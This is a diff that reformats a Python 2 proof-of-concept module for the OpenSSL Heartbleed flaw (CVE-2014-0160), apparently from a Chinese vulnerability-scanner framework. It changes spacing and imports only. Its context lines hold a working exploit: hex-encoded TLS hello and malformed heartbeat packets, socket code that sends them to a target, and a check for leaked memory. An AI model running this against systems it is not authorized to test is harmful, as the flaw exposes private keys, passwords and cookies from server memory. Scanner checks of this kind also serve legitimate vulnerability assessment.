@@ -6,26 +6,30 @@ import struct
 import socket
 import time
 import select
-import urllib, urlparse
+import urllib
+import urlparse
+
 
 class Vuln(ABVuln):
-    vuln_id = 'OpenSSL_0001' # 平台漏洞编号，留空
-    name = 'OpenSSL TLS和DTLS扩展包处理外界读内存泄露漏洞(CNVD-2014-02175)' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    vuln_id = 'OpenSSL_0001'  # 平台漏洞编号，留空
+    name = 'OpenSSL TLS和DTLS扩展包处理外界读内存泄露漏洞(CNVD-2014-02175)'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2014-04-07'  # 漏洞公布时间
     desc = '''
         OpenSSL是一款开放源码的SSL实现，用来实现网络通信的高强度加密。
         OpenSSL TLS和DTLS扩展包处理存在外界读内存泄露漏洞。由于程序未能正确处理Heartbeart扩展包，允许远程攻击者可以通过制作的数据包，读取服务器内存中的敏感信息(如用户名、密码、Cookie、私钥等)。仅OpenSSL的1.0.1及1.0.2-beta版本受到影响，包括：1.0.1f及1.0.2-beta1版本。
-    ''' # 漏洞描述
-    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2014-02175' # 漏洞来源
-    cnvd_id = 'CNVD-2014-02175' # cnvd漏洞编号
-    cve_id = 'CVE-2014-0160' #cve编号
+    '''  # 漏洞描述
+    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2014-02175'  # 漏洞来源
+    cnvd_id = 'CNVD-2014-02175'  # cnvd漏洞编号
+    cve_id = 'CVE-2014-0160'  # cve编号
     product = 'OpenSSL'  # 漏洞应用名称
     product_version = 'OpenSSL 1.0.1f3'  # 漏洞应用版本
 
+
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
+
 
 hello = h2bin('''
 16 03 02 00  dc 01 00 00 d8 03 02 53
@@ -49,6 +53,7 @@ hb = h2bin('''
 18 03 02 00 03
 01 40 00
 ''')
+
 
 def recvall(s, length, timeout=5):
     endtime = time.time() + timeout
@@ -92,22 +97,23 @@ def hit_hb(s):
         if typ == 21:
             return False
 
+
 class Poc(ABPoc):
     poc_id = 'c033ce12-7058-42b0-9b86-7dcc365418f7'
     author = 'cscan'  # POC编写者
-    create_date = '2018-04-20' # POC创建时间
+    create_date = '2018-04-20'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
 
     def verify(self):
         try:
-            
-            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
-                target = self.target, vuln = self.vuln))
 
-            #https://github.com/Medicean/VulApps/tree/master/o/openssl/heartbleed_CVE-2014-0160
-            #取出地址和端口
+            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
+                target=self.target, vuln=self.vuln))
+
+            # https://github.com/Medicean/VulApps/tree/master/o/openssl/heartbleed_CVE-2014-0160
+            # 取出地址和端口
             target_parse = urlparse.urlparse(self.target)
             host = socket.gethostbyname(target_parse.hostname)
             port = target_parse.port if target_parse.port else 80
@@ -126,7 +132,8 @@ class Poc(ABPoc):
             s.send(hb)
             if hit_hb(s):
                 #print "Heartbleed OpenSSL: %s : %s" % (host, str(port))
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
             else:
                 print "Not Vulnerable."
             s.close()
@@ -137,6 +144,6 @@ class Poc(ABPoc):
     def exploit(self):
         self.verify()
 
+
 if __name__ == '__main__':
     Poc().run()
-
